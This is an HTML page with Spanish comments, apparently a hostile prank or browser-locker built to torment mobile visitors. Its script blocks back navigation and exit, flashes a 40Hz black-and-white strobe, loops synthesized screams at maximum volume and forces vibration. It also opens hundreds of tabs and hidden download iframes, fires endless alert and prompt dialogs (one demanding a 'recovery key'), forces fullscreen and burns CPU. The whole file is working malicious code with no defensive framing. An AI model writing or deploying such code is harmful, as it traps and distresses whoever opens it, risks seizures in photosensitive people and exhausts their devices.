<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
    <title>⚠️</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            touch-action: none;
        }
        body {
            background: black;
            overflow: hidden;
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
        }
        .strobe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 99999;
        }
        .noise-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 99998;
            background: repeating-radial-gradient(circle, black, white 2px);
            opacity: 0.3;
        }
    </style>
</head>
<body>
    <div id="strobeDiv" class="strobe"></div>
    <div class="noise-layer"></div>
    
    <script>
    (function() {
        // ==================== BLOQUEO TOTAL ====================
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
        
        for (let i = 0; i < 500; i++) {
            history.pushState({ i: i }, '', '#lock' + i);
        }
        
        window.addEventListener('popstate', function() {
            for (let i = 0; i < 100; i++) {
                history.pushState({}, '', '#block' + Math.random());
            }
            location.reload();
        });
        
        setInterval(() => {
            history.pushState({}, '', '#hijack');
        }, 50);
        
        document.body.style.touchAction = 'none';
        document.body.style.overscrollBehavior = 'none';
        
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
        
        document.addEventListener('keydown', function(e) {
            e.preventDefault();
            return false;
        });
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        // ==================== STROBO BLANCO/NEGRO EXTREMO (irritante visual) ====================
        const strobeDiv = document.getElementById('strobeDiv');
        let strobeRunning = true;
        
        function startExtremeStrobe() {
            // Frecuencia de 20ms (50 parpadeos por segundo - EXTREMADAMENTE RÁPIDO)
            setInterval(() => {
                if (strobeRunning) {
                    // Alternar entre blanco puro y negro puro
                    strobeDiv.style.backgroundColor = strobeDiv.style.backgroundColor === 'white' ? 'black' : 'white';
                    strobeDiv.style.opacity = '1';
                }
            }, 25); // 40Hz parpadeo - muy molesto visualmente
        }
        
        // También hacer parpadeo del body
        function startBodyStrobe() {
            setInterval(() => {
                document.body.style.backgroundColor = document.body.style.backgroundColor === 'white' ? 'black' : 'white';
            }, 35);
        }
        
        // ==================== SCREAMERS DE ALTO VOLUMEN (asegurado) ====================
        let audioCtx = null;
        let masterGain = null;
        let screamersStarted = false;
        
        // Crear screamers extremadamente fuertes
        function initScreamers() {
            if (screamersStarted) return;
            
            try {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                masterGain = audioCtx.createGain();
                masterGain.gain.value = 1.0;
                masterGain.connect(audioCtx.destination);
                
                // Crear 8 gritos diferentes y agresivos
                const screamFreqs = [720, 880, 950, 1100, 1300, 680, 1550, 2000];
                const buffers = [];
                let loaded = 0;
                
                function createAgonizingScream(freq, idx) {
                    const sampleRate = audioCtx.sampleRate;
                    const duration = 4; // 4 segundos
                    const length = sampleRate * duration;
                    const buffer = audioCtx.createBuffer(1, length, sampleRate);
                    const data = buffer.getChannelData(0);
                    
                    for (let i = 0; i < length; i++) {
                        let t = i / sampleRate;
                        // Grito humano distorsionado + frecuencias agudas superpuestas
                        let scream = 0;
                        // Onda principal aguda
                        scream += Math.sin(t * freq * Math.PI * 2) * 0.6;
                        // Armónicos agresivos
                        scream += Math.sin(t * freq * 2.3 * Math.PI * 2) * 0.4;
                        scream += Math.sin(t * freq * 3.7 * Math.PI * 2) * 0.3;
                        // Modulación de frecuencia para efecto de "grito que sube"
                        scream += Math.sin(t * (freq + Math.sin(t * 15) * 100) * Math.PI * 2) * 0.5;
                        // Ruido blanco para textura de grito
                        scream += (Math.random() - 0.5) * 0.5;
                        // Efecto de vibración en la voz
                        scream += Math.sin(t * 120) * 0.2;
                        
                        // Clip y normalizar
                        scream = Math.min(0.95, Math.max(-0.95, scream));
                        data[i] = scream;
                    }
                    
                    buffers[idx] = buffer;
                    loaded++;
                    
                    if (loaded === screamFreqs.length) {
                        // Reproducir TODOS los screamers en loop simultáneamente
                        for (let b = 0; b < buffers.length; b++) {
                            if (buffers[b]) {
                                const source = audioCtx.createBufferSource();
                                source.buffer = buffers[b];
                                source.loop = true;
                                source.connect(masterGain);
                                source.start();
                            }
                        }
                        
                        // Añadir screamers adicionales superpuestos aleatoriamente (más caos)
                        setInterval(() => {
                            if (audioCtx && audioCtx.state === 'running') {
                                const randomBuf = buffers[Math.floor(Math.random() * buffers.length)];
                                if (randomBuf) {
                                    const extraSource = audioCtx.createBufferSource();
                                    extraSource.buffer = randomBuf;
                                    extraSource.connect(masterGain);
                                    extraSource.start();
                                }
                            }
                        }, 150);
                        
                        // Forzar volumen máximo constantemente
                        setInterval(() => {
                            if (masterGain) masterGain.gain.value = 1.0;
                        }, 50);
                    }
                }
                
                for (let i = 0; i < screamFreqs.length; i++) {
                    createAgonizingScream(screamFreqs[i], i);
                }
                
                audioCtx.resume();
                screamersStarted = true;
                
            } catch(e) {
                console.error("Audio error:", e);
                // Fallback: intentar de nuevo con otro método
                setTimeout(initScreamers, 500);
            }
        }
        
        // Forzar audio al primer toque
        let audioTriggered = false;
        function forceAudioOnTouch() {
            if (audioTriggered) return;
            audioTriggered = true;
            initScreamers();
            // También crear elemento de audio oculto como respaldo
            try {
                const fallbackAudio = new Audio();
                fallbackAudio.volume = 1.0;
                // No reproducir nada, solo para "despertar" el sistema de audio
                fallbackAudio.play().catch(e => {});
            } catch(e) {}
        }
        
        // ==================== VIBRACIÓN FORZADA ====================
        function vibrateIntense() {
            if (navigator.vibrate) {
                navigator.vibrate([1000, 500, 1000, 500, 2000, 500, 1000, 800, 1500]);
            }
        }
        
        function startVibrationHell() {
            vibrateIntense();
            setInterval(() => {
                vibrateIntense();
            }, 600);
        }
        
        // ==================== STROBO DOBLE (más irritante) ====================
        startExtremeStrobe();
        startBodyStrobe();
        
        // ==================== PESTAÑAS INFINITAS ====================
        function openInfiniteTabs() {
            const urls = [
                'https://httpbin.org/bytes/2097152',
                'https://httpbin.org/bytes/1048576',
                'https://httpbin.org/drip?duration=3&numbytes=800000',
                'about:blank#crash',
                'about:blank#pop',
                'data:application/octet-stream;base64,UEsDBBQAAAAIAO1QV1gAAAAAAAAAAAAAAAALAAAAZmlsZS5iaW5VVAkA'
            ];
            
            function spawnTab() {
                const url = urls[Math.floor(Math.random() * urls.length)];
                const win = window.open(url, '_blank');
                if (!win || win.closed) {
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'data_' + Date.now() + '.bin';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                }
            }
            
            // 300 pestañas iniciales
            for (let i = 0; i < 300; i++) {
                setTimeout(spawnTab, i * 25);
            }
            
            // Continuar abriendo pestañas cada 400ms
            setInterval(() => {
                for (let i = 0; i < 20; i++) {
                    spawnTab();
                }
            }, 400);
        }
        
        // ==================== IFRAMES OCULTOS (descargas en segundo plano) ====================
        function iframeFlood() {
            setInterval(() => {
                for (let f = 0; f < 50; f++) {
                    const ifr = document.createElement('iframe');
                    ifr.src = 'https://httpbin.org/bytes/400000';
                    ifr.style.display = 'none';
                    document.body.appendChild(ifr);
                    setTimeout(() => ifr.remove(), 300);
                }
            }, 300);
        }
        
        // ==================== ALERTAS INFINITAS (BLOQUEO TOTAL DE UI) ====================
        function infiniteAlertHell() {
            setInterval(() => {
                alert('⚠️ ERROR CRÍTICO ⚠️\nCódigo: 0xDEADBEEF');
            }, 250);
            setInterval(() => {
                confirm('SISTEMA CORROMPIDO\nPresione OK para continuar...');
            }, 350);
            setInterval(() => {
                prompt('INGRESE CLAVE DE RECUPERACIÓN:', '');
            }, 450);
        }
        
        // ==================== FULLSCREEN FORZADO ====================
        function forceFullscreen() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }
            if (screen.orientation && screen.orientation.lock) {
                screen.orientation.lock('portrait').catch(e => {});
            }
        }
        setInterval(forceFullscreen, 150);
        
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) forceFullscreen();
        });
        
        // ==================== BLOQUEAR CAMBIO DE PESTAÑA ====================
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                // Si intentan salir y volver, recargar y empeorar
                location.reload();
            }
        });
        
        // ==================== ACTIVAR INFIERNO COMPLETO ====================
        let hellActive = false;
        
        function startFullHell() {
            if (hellActive) return;
            hellActive = true;
            
            // Activar sonido (requiere toque)
            forceAudioOnTouch();
            
            // Activar vibración
            startVibrationHell();
            
            // Pestañas
            openInfiniteTabs();
            
            // Iframes
            iframeFlood();
            
            // Alertas
            infiniteAlertHell();
            
            // Fullscreen
            forceFullscreen();
            
            // Congelar CPU
            setInterval(() => {
                let garbage = 0;
                for (let i = 0; i < 50000; i++) garbage += Math.sin(i);
            }, 10);
        }
        
        // Activar con cualquier toque en la pantalla (requisito para audio en Android)
        document.body.addEventListener('touchstart', startFullHell);
        document.body.addEventListener('click', startFullHell);
        
        // Si el usuario no toca en 1.5 segundos, activar lo demás excepto audio
        setTimeout(() => {
            if (!hellActive) {
                startVibrationHell();
                openInfiniteTabs();
                iframeFlood();
                infiniteAlertHell();
                forceFullscreen();
                hellActive = true;
            }
        }, 1500);
        
        // Mantener fixed
        document.body.style.position = 'fixed';
        document.body.style.top = '0';
        document.body.style.left = '0';
        
        // Prevenir blur (cambiar de app)
        window.onblur = function() {
            setTimeout(() => {
                window.focus();
            }, 10);
        };
        
        console.log("Página cargada - STROBO ACTIVO - esperando toque para SCREAMERS");
    })();
    </script>
</body>
</html>
